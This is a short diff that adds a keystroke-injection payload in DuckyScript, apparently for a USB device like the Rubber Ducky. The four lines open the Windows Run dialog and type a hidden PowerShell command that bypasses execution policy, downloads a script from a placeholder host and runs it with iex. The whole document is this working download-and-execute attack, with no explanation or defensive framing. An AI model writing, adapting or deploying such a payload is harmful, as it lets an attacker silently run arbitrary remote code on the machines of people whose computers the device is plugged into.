@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass irm http://linktops1here | iex
+ENTER
